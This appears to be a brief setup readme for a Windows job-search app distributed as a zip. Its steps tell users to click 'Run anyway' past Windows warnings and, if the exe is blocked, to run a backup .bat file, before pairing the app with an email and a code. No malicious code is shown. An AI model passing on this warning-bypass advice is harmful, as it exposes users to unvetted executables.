AMELIA JOB SEARCH 0.4.13 - SETUP

1. Right-click this zip, choose Extract All.
2. Double-click Amelia Job Search.exe (if Windows warns: More info, then Run anyway).
3. If the exe is blocked, double-click Amelia Job Search (backup).bat instead.
4. Follow the connection checks, then open the app, press PAIR MY WIDGET, enter your email and the AJS- code, press SEND. Chad approves you.
